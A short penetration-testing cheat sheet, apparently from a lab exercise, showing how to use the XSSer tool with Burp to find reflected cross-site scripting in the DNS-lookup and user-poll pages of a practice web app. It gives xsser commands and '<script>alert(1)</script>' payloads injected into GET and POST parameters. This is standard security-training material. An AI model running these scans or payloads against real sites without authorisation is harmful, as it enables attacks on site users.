## xsser

For help `xsser --help`

### POST Request

Using burp grab the string at the bottom of the capture:
```html
POST /index.php?page=dns-lookup.php HTTP/1.1
Host: 192.27.117.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.27.117.3/index.php?page=dns-lookup.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Connection: close
Cookie: PHPSESSID=phenufoqo4kahufispj4gra1u5; showhints=1
Upgrade-Insecure-Requests: 1

target_host=worms&dns-lookup-php-submit-button=Lookup+DNS
```

To see if the target is  vulerable, craft the xsser command as replacing the search value with "xss"
```bash
xsser --url 'http://$IP/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
```

Can also add `--auto` at the end to try various payloads

Add a custom payload via:
```bash
xsser --url 'http://$IP/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"
```

Then use the resulting value back into burp repeater:
```bash
target_host=%3Cscript%3Ealert%281%29%3C%2Fscript%3E%0A&dns-lookup-php-submit-button=Lookup+DNS
```

### GET request

Same process from browser instead of burp

Copy the URL, replace the nmap value with "XSS" and pass it to XSSer URL: `http://192.94.37.3/index.php?page=user-poll.php&csrf-token=&choice=nmap&initials=jd&user-p oll-php-submit-button=Submit+Vote`

Command: 
```bash
xsser --url “http://$IP/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=jd&user-poll-php-submit-button=Submit+Vote”
```

Then copy the xss command from xsser into URL and script will run:
```bash
http://$IP/index.php?page=user-poll.php&csrf-token=&choice=%3Cscript%3Ealert%281 %29%3C%2Fscript%3E&initials=jd&user-poll-php-submit-button=Submit+Vote
```



